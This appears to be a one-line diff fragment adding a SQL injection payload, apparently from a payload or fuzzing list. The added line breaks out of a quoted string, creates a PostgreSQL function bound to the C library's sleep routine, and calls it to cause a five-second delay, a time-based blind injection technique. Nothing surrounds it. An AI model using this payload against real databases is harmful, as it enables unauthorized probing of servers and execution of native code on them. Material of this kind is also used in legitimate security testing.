@@ -1,0 +1,1 @@
+1%")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((("%"="
